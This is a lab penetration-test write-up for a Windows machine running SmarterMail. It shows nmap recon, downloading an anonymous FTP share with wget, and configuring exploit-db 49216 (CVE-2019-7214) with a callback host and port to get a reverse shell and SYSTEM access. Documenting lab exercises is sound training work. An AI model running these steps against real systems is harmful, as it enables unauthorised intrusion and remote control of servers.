# Report - Algernon

- Author: Henry Post
- Target: Algernon
- Target IP: 192.168.53.65
- Date: 04/20/2026
## Executive Summary

This machine, Algernon, was enumerated by `nmap` to be running FTP, and SmarterMail.

The SmarterMail software was vulnerable to `CVE-2019-7214`, a remote code execution vulnerability.

This CVE was used to get SYSTEM level access.

### Recommendations
1. Update `SmarterMail` to the latest non-vulnerable version.
2. Do not use FTP anonymous login. Require a strong password.
## Recon

We scan with `nmap -sS -sV algernon`.

```
???(kali?kali)-[~]
??$ nmap -sS -sV algernon
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-17 22:33 +0000
Nmap scan report for algernon (192.168.53.65)
Host is up (0.00043s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
80/tcp   open  http          Microsoft IIS httpd 10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
9998/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.94 seconds

```

We notice port 21, 80, ms-services, and 9998 are open.
## Non-root access

We visit http://algernon:9998/interface/root#/login .

It's running SmarterMail v17.
## Root access

https://medium.com/@Dpsypher/pg-practice-algernon-5382b92a8142

We're going to cheat a bit. It's late and I'm tired.

Let's try FTP. `wget -r` dumps all files.

```bash
wget -r ftp://Anonymous:potato123@algernon
```

Some interesting files. They use ClamAV.

```
/home/kali/algernon/Logs/2020.05.12-administrative.log

03:35:45.726 [192.168.118.6] User @ calling create primary system admin, username: admin
03:35:47.054 [192.168.118.6] Webmail Attempting to login user: admin
03:35:47.054 [192.168.118.6] Webmail Login successful: With user admin
03:35:55.820 [192.168.118.6] Webmail Attempting to login user: admin
03:35:55.820 [192.168.118.6] Webmail Login successful: With user admin
03:36:00.195 [192.168.118.6] User admin@ calling set setup wizard settings
03:36:08.242 [192.168.118.6] User admin@ logging out
```

From the guide,
> Deploy the SmarterMail RCE exploit with a reverse shell payload.

Okay. Let's try one.

```sh
searchsploit smartermail
# SmarterMail Build 6985 - Remote Code Execution                          | windows/remote/49216.py

searchsploit --path 49216
# /usr/share/exploitdb/exploits/windows/remote/49216.py

cp /usr/share/exploitdb/exploits/windows/remote/49216.py ./

ip a |grep 192 #attacker=192.168.49.56

# edit file....
<<EOF
HOST='algernon'
PORT=17001
LHOST='192.168.49.56'
LPORT=4444
EOF

# It works!
```

We now have non-root access by using exploit `49216`.

We notice the user `dean` exists.

```
PS C:\users> dir

    Directory: C:\users

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        4/29/2020  10:30 PM                .NET v4.5
d-----        4/29/2020  10:30 PM                .NET v4.5 Classic
d-----         5/2/2022   7:05 AM                Administrator
d-----        4/23/2020   3:16 AM                dean
d-r---        4/22/2020   4:54 AM                Public
```


![](Pasted%20image%2020260420104529.png)

We get the reverse shell callback.

![](Pasted%20image%2020260420104616.png)

We have SYSTEM level access.